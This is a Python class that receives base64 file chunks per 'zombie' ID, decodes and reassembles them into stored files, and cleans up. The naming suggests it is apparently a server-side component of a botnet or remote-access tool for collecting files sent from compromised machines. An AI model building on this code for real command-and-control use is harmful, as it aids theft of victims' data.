import secrets
import logging
from base64 import b64decode
from pathlib import Path
from os import remove
from datetime import datetime

logger = logging.getLogger("ioFiles")

class ioFiles:
    def __init__(self, zombieID: str, basePath: str):
        self.zombieID = zombieID
        self.base_path = Path(basePath)
        self.home = self.base_path / "files" / "zombies" / zombieID
        self._build_dirs()

    def _build_dirs(self):
        (self.home / "pre").mkdir(parents=True, exist_ok=True)
        (self.home / "post").mkdir(parents=True, exist_ok=True)

    def write_chunk(self, chunk_name: str, data: str):
        try:
            path = self.home / "pre" / chunk_name
            # Use 'w' for text-based base64 strings
            with open(path, 'w') as f:
                f.write(data)
            return True
        except Exception as e:
            logger.error(f"Unable to write chunk {chunk_name}: {e}")
            return False

    def process_file(self, zombieID: str):
        pre = self.home / "pre"
        post = self.home / "post"

        # 1. Get and sort files numerically (CHUNK_0, CHUNK_1...)
        try:
            prefiles = sorted(
                pre.iterdir(),
                key=lambda x: int(x.stem.split('_')[1]) if '_' in x.stem else 0
            )
        except Exception as e:
            logger.error(f"Sorting error for {zombieID}: {e}")
            return None

        # 2. Decode chunks INDIVIDUALLY before joining
        binary_blobs = []
        for file in prefiles:
            try:
                with open(file, 'r') as f:
                    content = f.read()
                    if ":" in content:
                        b64_part = content.split(":")[1]
                        # DECODE HERE: Convert B64 string to raw bytes immediately
                        binary_blobs.append(b64decode(b64_part))
            except Exception as e:
                logger.error(f"Error decoding chunk {file.name}: {e}")

        if not binary_blobs:
            return None

        try:
            # 3. Join raw bytes (safe and memory-efficient)
            full_binary_data = b"".join(binary_blobs)

            token = secrets.token_hex(15)
            post_path = post / token

            with open(post_path, 'wb') as f:
                f.write(full_binary_data)

            # 4. Cleanup pre files
            for file in prefiles:
                remove(file)

            logger.info(f"Successfully processed file for {zombieID}. Size: {len(full_binary_data)} bytes")
            return token
        except Exception as e:
            logger.error(f"Failed to save final file: {e}")
            return None